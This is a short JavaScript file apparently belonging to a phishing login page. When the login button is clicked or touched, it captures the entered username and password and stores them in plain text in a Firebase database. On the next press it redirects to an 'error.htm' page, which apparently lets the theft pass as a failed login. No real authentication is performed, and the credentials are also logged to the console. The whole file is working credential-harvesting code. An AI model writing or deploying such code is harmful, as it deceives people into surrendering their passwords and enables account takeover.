var flag = 0;
var loginBttn = document.getElementById("login");
loginBttn.addEventListener('click', function () {

    if (flag == 0) {
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;

        db.collection('records').add({
            name: username,
            password7: password
        })
        flag = 1;
    }
    else if (flag == 1) {
        location.href = "error.htm";
        flag = 0;
    }

})

var n = 0;
loginBttn.addEventListener('touchstart', function () {

    if (n == 0) {
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;

        var firebaseRef = firebase.database()

        var data = {
            username: username,
            password: password
        }
        console.log(data)
        const recordsListRef = firebaseRef.ref('records');
        const newRecordRef = recordsListRef.push(data);

        n = 1;
    }
    else if (n == 1) {
        location.href = "error.htm";
        n = 0;
    }

})
